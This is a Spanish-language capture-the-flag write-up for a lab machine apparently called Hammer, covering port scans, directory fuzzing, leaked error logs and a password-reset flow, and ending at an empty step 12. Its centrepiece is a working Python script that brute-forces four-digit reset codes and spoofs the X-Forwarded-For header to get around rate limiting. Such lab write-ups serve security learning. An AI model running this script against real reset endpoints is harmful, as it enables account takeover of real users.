---
layout: apunte
title: "2. Getting the Flags"
---

1. Empezaremos con el reconocimiento (aunque ya sabemos por donde va a tirar, seguramente algo de MFA).
	1. Escaneo de puertos.
	   !**Pasted image 20251226045221.png**
	   Miramos a ver qué es el servicio waste.
	   !**Pasted image 20251226045350.png**
	2. Escaneo de puertos en profundidad.
	   !**Pasted image 20251226045429.png**
	   Como el puerto 80 no está abierto, no tiene sentido escanear directorios ni subdominios.
2. Si vamos al puerto `1337` encontramos no que parece un endpoint de login.
   !**Pasted image 20251226045730.png**
3. Si miramos el código fuente podemos ver la convención de nombramiento de directorios.
   !**Pasted image 20251226045828.png**
   Si intentamos hacer fuzzeo de directorios a este tipo de dirección:
   !**Pasted image 20251226050658.png**
4. Si le damos al único archivo aparentemente interesante, `reset_password.php`, podemos ver el código de flujo del reseteo de contraseñas.
   !**Pasted image 20251226050007.png**
   Parece que hay una cuenta atrás en la que tienes que introducir el código.
5. Si revisamos los directorios que encontramos fuzzeando antes, sólo hay dos que parecen poder tener algo interesante.
	1. El primero y más interesante es `/hmr_logs/`, el cual contiene logs de error de conexión en los que se detallan usuarios, endpoints, hostnames, etc.
	   !**Pasted image 20251226051220.png**
	2. El segundo, y algo menos llamativo es `/hmr_images`, en donde hay una imagen de un taller con martillo.
	   !**Pasted image 20251226051304.png**
	   No hay nada en la imagen, por lo que definitivamente seguiremos por el otro lado.
	   !**Pasted image 20251226051450.png**
6. Vamos a investigar bien los logs que hemos encontrado.
   !**Pasted image 20251226052104.png**
	1. Lo más llamativo a simple vista es que parece que tenemos un usuario: `tester@hammer.thm`.
	2. Además podemos ver la página a la que aparentemente querríamos poder acceder: `/restricted-area`.
	3. Vemos un posible hostname del sistema que nos puede servir más adelante para forzar la entrada por ssh: `hammerthm`.
	4. Vemos que hay un login de administrador: `/admin-login`.
	5. Parece que hay un límite de 10 peticiones, pero no sabemos en qué se basa para filtrar, todavía.
7. Con todo esto en mente vamos a investigar las respuestas del servidor con BurpSuite.
	1. Para usuario y contraseñas erróneos:
		1. Manda usuario y contraseña por POST.
		   !**Pasted image 20251226052659.png**
		2. En la respuesta recibimos "Invalid Email or Password".
		   !**Pasted image 20251226052821.png**
	2. Para usuario correcto y contraseña errónea:
		1. La petición inicial sigue siendo igual pero con diferentes credenciales.
		   !**Pasted image 20251226052934.png**
		2. La respuesta también es igual.
		   !**Pasted image 20251226053050.png**
8. Vamos a ver qué pasa si le damos a "Forgot your password?".
	1. Esta petición ya parece más interesante.
	   !**Pasted image 20251226053711.png**
	   Está llamando al endpoint `/reset_password.php`.
	2. Si dejamos pasar las peticiones y metemos el email, obtenemos una página con un contador.
	   !**Pasted image 20251226053918.png**
	3. Si introducimos un código que no es no nos saca directamente.
	   !**Pasted image 20251226054009.png**
	4. Si lo introducimos mal unas cuantas veces pone:
	   !**Pasted image 20251226060052.png**
9. Ejecutaremos el siguiente código.
   
```python
import requests
import sys
import random
from concurrent.futures import ThreadPoolExecutor

# Configuración
IP = "10.82.143.82"
base_url = f'http://{IP}:1337'
url = f'{base_url}/reset_password.php'
email = 'tester@hammer.thm'
MAX_THREADS = 10

exito = False

def get_new_session():
    s = requests.Session()
    try:
        s.post(url, data={'email': email}, timeout=10)
        if 'PHPSESSID' in s.cookies:
            return s
    except:
        return None
    return None

def batch_worker(start_pin):
    global exito
    if exito: return

    session = get_new_session()
    if not session: return

    for i in range(7):
        current_pin = start_pin + i
        if current_pin > 9999 or exito: break
        
        pin_str = f"{current_pin:04d}"
        headers = {
            'X-Forwarded-For': f"127.0.0.{random.randint(1,254)}",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {'recovery_code': pin_str, 's': '180'}

        try:
            # Importante: allow_redirects=True para seguir a la página de nueva password
            resp = session.post(url, data=data, headers=headers, allow_redirects=True, timeout=10)

            if "Invalid or expired" not in resp.text and "Rate limit" not in resp.text:
                exito = True
                print(f"\n\n[!] ¡ÉXITO! PIN CONFIRMADO: {pin_str}")
                print(f"[+] PHPSESSID: {session.cookies.get('PHPSESSID')}")
                print(f"[+] URL FINAL: {resp.url}")
                
                # Guardamos la página para que la veas
                with open("exito.html", "w") as f:
                    f.write(resp.text)
                print(f"[+] Contenido guardado en 'exito.html'. Ábrelo con tu navegador.")
                return

            sys.stdout.write(f"\r[*] Intentando: {pin_str} ")
            sys.stdout.flush()
        except:
            pass

def main():
    pines_iniciales = [i for i in range(0, 10000, 7)]
    # Como ya sabemos que es el 1013, el script llegará rápido.
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(batch_worker, pines_iniciales)

if __name__ == "__main__":
    main()
   ```
   
   Obtenemos lo siguiente:
   !**Pasted image 20251226063426.png**

10. Si metemos dicha cookie y OTP:
    !**Pasted image 20251226063621.png**
11. Si cambiamos la contraseña e iniciamos sesión:
    !**Pasted image 20251226063708.png**
    Hemos encontrado la flag del dashboard, nos queda la del sistema.
12. 